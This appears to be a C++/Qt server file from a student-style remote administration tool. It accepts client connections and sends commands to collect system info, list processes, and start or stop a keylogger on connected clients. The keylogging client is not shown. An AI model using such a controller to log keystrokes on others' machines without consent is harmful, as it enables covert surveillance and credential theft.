#include "ServerApp.hpp"
#include <QDebug>

ServerApp::ServerApp(const std::string& envFilePath)
    : m_envFilePath(envFilePath)
{
#ifdef _WIN32
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
#endif

    EnvLoader::loadEnv(m_envFilePath);
    int port = EnvLoader::loadPort(m_envFilePath);
    std::cout << "ServerApp: listening on port " << port << "...\n";

    m_serverSocket.bindSocket(port);
    m_serverSocket.listenSocket();
}

ServerApp::~ServerApp()
{
    m_serverSocket.closeSocket();
}

// Prepare the fd_set and compute current maxFd for select()
// Adds listening socket and all client sockets.
void ServerApp::prepareFdSet(fd_set& readfds, int& maxFd, int& listenFd)
{
    FD_ZERO(&readfds);
    listenFd = m_serverSocket.getSocketFd();
    FD_SET(listenFd, &readfds);
    maxFd = listenFd;
    for (const auto& c : m_clients) {
        int fd = c->getSocketFd();
        FD_SET(fd, &readfds);
        if (fd > maxFd) maxFd = fd;
    }
}

// Accept a new incoming client if the listening socket is ready.
void ServerApp::acceptNewClientIfAny(const fd_set& readfds, int listenFd)
{
    if (FD_ISSET(listenFd, &readfds)) {
        auto newCl = m_serverSocket.acceptSocket();
        std::cout << "Client connected: " << newCl->getClientIP() << " (awaiting user info)\n";
        m_clients.push_back(std::move(newCl));
        m_clientUsers.emplace_back();
    }
}

// Process one client at index idx: receive, deserialize, handle GET_INFO vs others.
// Updates idx appropriately (increment or stays if client removed).
void ServerApp::processClient(size_t& idx, const fd_set& readfds, uint32_t& nextSessionId)
{
    auto& client = m_clients[idx];
    int fd = client->getSocketFd();
    if (!FD_ISSET(fd, &readfds)) { ++idx; return; }

    try {
        auto data = client->recvBinary();
        auto pkt = LPTF_Packet::deserialize(data);
        std::string clientInfo = m_clientUsers[idx] + " " + client->getClientIP();

        if (pkt.getType() == PacketType::GET_INFO) {
            // Extract username from JSON-ish payload and emit connected signal.
            std::string payload(pkt.getPayload().begin(), pkt.getPayload().end());
            const std::string key = "\"username\":\"";
            std::string username;
            auto pos = payload.find(key);
            if (pos != std::string::npos) {
                pos += key.size();
                auto end = payload.find('"', pos);
                if (end != std::string::npos)
                    username = payload.substr(pos, end - pos);
            }
            m_clientUsers[idx] = username;
            clientInfo = username + " " + client->getClientIP();
            emit clientConnected(QString::fromStdString(clientInfo), nextSessionId++);
        } else {
            // Other packet types: forward to UI and optionally ack.
            std::string msg(pkt.getPayload().begin(), pkt.getPayload().end());
            qDebug() << "[ServerApp] pkt=" << static_cast<int>(pkt.getType())
                     << " from" << QString::fromStdString(clientInfo)
                     << "payload size=" << msg.size();
            emit clientResponse(QString::fromStdString(clientInfo), QString::fromStdString(msg));
            std::string ackStr = "ACK: " + msg;
            LPTF_Packet ack(1, PacketType::RESPONSE, 0, 0, 0,
                            std::vector<uint8_t>(ackStr.begin(), ackStr.end()));
            client->sendBinary(ack.serialize());
        }
        ++idx;
    } catch (const std::exception& e) {
        std::cout << "Client disconnect: " << client->getClientIP()
                  << " (" << e.what() << ")\n";
        m_clients.erase(m_clients.begin() + idx);
        m_clientUsers.erase(m_clientUsers.begin() + idx);
    }
}

// Main loop, now short: orchestrates helpers to satisfy the 25-line body constraint.
void ServerApp::run()
{
    std::cout << "Server ready, waiting for connections...\n";
    uint32_t nextSessionId = 1;

    while (true)
    {
        fd_set readfds;
        int maxFd = 0, listenFd = 0;
        prepareFdSet(readfds, maxFd, listenFd);
        if (select(maxFd + 1, &readfds, nullptr, nullptr, nullptr) < 0) {
            std::cerr << "select() error: " << std::strerror(errno) << "\n";
            break;
        }
        acceptNewClientIfAny(readfds, listenFd);
        for (size_t i = 0; i < m_clients.size(); )
            processClient(i, readfds, nextSessionId);
    }
}

void ServerApp::onGetInfoSys(const QString& clientId)
{
    uint32_t sessionId = 0;
    LPTF_Packet packet(1, PacketType::GET_INFO, 0, 0, sessionId, {});
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
}

void ServerApp::onStartKeylogger(const QString& clientId)
{
    qDebug() << "[ServerApp] onStartKeylogger for" << clientId;
    const std::string cmdStart = "start";
    std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
    const uint32_t packetId = 1;
    const uint32_t sessionId = 0;
    LPTF_Packet packet(1, PacketType::KEYLOG, 0, packetId, sessionId, startPayload);
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
    qDebug() << "[ServerApp] Keylogger started for" << clientId;
}

void ServerApp::onStopKeylogger(const QString& clientId)
{
    qDebug() << "[ServerApp] onStopKeylogger for" << clientId;
    const std::string cmdStop = "stop";
    std::vector<uint8_t> stopPayload(cmdStop.begin(), cmdStop.end());
    const uint32_t packetId = 1;
    const uint32_t sessionId = 0;
    LPTF_Packet packet(1, PacketType::KEYLOG, 0, packetId, sessionId, stopPayload);
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
    qDebug() << "[ServerApp] Keylogger stopped for" << clientId;
}

void ServerApp::onRequestProcessList(const QString& clientId, bool namesOnly)
{
    qDebug() << "[ServerApp] onRequestProcessList for" << clientId << "namesOnly=" << namesOnly;
    uint32_t sessionId = 0;
    uint8_t flags = namesOnly ? 1 : 0;
    LPTF_Packet packet(1, PacketType::PROCESS_LIST, flags, 0, sessionId, {});
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
}

void ServerApp::sendToClient(const QString& clientInfo, const QByteArray& data)
{
    sendToClientInternal(clientInfo, data);
}

void ServerApp::sendToClientInternal(const QString& clientId, const QByteArray& data)
{
    auto parts = clientId.split(' ');
    const QString ip = (parts.size() >= 2 ? parts.last() : QString());
    for (const auto& sockPtr : m_clients) {
        if (QString::fromStdString(sockPtr->getClientIP()) == ip) {
            std::vector<uint8_t> raw(
                reinterpret_cast<const uint8_t*>(data.constData()),
                reinterpret_cast<const uint8_t*>(data.constData()) + data.size()
            );
            sockPtr->sendBinary(raw);
            return;
        }
    }
    qWarning() << "sendToClientInternal: client not found:" << clientId;
}
